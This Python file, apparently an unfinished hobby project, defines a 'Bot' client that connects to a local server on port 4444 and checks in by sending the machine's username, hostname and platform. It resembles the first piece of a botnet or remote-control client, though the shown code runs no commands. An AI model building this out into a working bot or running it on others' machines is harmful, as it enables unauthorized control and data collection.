# Just like the server.py, I'll continue this tomorrow.

import threading
import socket
import json
import sys
import os

class Bot(object):
    sock: socket.socket = None

    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
    
    def start(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock = sock
        sock.settimeout(10)
        sock.connect((self.host, self.port))
        self.send_login()
    
    def recv_message(self):
        message = b""

        while True:
            chunk = self.sock.recv(1)
            if not chunk:
                raise Exception
            
            message += chunk
            if message.endswith(b"\r\n\r\n"):
                break
        
        return json.loads(message)

    def send_message(self, message: dict):
        return self.sock.send(f"{json.dumps(message)}\r\n\r\n".encode())
    
    def send_login(self):
        login_message = {
            "op": "LOGIN",
            "data": {
                "username": os.getenv("USERNAME"),
                "hostname": socket.gethostname(),
                "platform": sys.platform
            }
        }

        return self.send_message(login_message)

def main():
    bot = Bot(host="127.0.0.1", port=4444)
    bot.start()

if __name__ == "__main__":
    main()
